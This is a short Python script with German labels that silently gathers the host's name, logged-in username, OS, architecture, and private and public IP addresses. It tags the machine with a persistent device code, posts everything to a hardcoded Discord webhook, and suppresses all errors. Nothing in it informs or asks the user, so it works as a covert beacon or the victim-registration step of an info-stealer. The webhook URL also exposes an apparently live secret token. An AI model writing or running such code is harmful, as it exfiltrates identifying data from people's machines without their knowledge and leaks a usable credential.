import os
import uuid
import json
import requests
import socket
import platform

WEBHOOK_URL = "https://discord.com/api/webhooks/1358373171358732498/QYKzh_Svlv7Dfyrf4mVjH2dOv_-Hil7ZqrVYUdWyS0g7TO_DiGE5OryLkBL9QrKpdkkR" 
CODE_FILE = "device_code.json"

def generate_code():
    raw = uuid.uuid4().hex.upper() + uuid.uuid4().hex.upper()
    blocks = [raw[i:i+6] for i in range(0, 36, 6)]
    return "-".join(blocks)

if os.path.exists(CODE_FILE):
    with open(CODE_FILE, "r") as f:
        device_data = json.load(f)
        code = device_data.get("code")
else:
    code = generate_code()
    with open(CODE_FILE, "w") as f:
        json.dump({"code": code}, f)

hostname = socket.gethostname()
username = os.getenv("USERNAME") or os.getenv("USER")
os_info = platform.system() + " " + platform.release()
architecture = platform.machine()

try:
    private_ip = socket.gethostbyname(hostname)
except:
    private_ip = "Unbekannt"

try:
    public_ip = requests.get("https://api.ipify.org").text
except:
    public_ip = "Unbekannt"

embed = {
    "title": "📡 Neues Gerät registriert",
    "color": 0x3498db,
    "fields": [
        {"name": "Geräte-Code", "value": f"`{code}`", "inline": False},
        {"name": "Hostname", "value": hostname, "inline": True},
        {"name": "Benutzer", "value": username, "inline": True},
        {"name": "Betriebssystem", "value": os_info, "inline": False},
        {"name": "Architektur", "value": architecture, "inline": True},
        {"name": "Private IP", "value": private_ip, "inline": True},
        {"name": "Öffentliche IP", "value": public_ip, "inline": False},
    ]
}

payload = {"embeds": [embed]}

try:
    requests.post(WEBHOOK_URL, json=payload)
except:
    pass
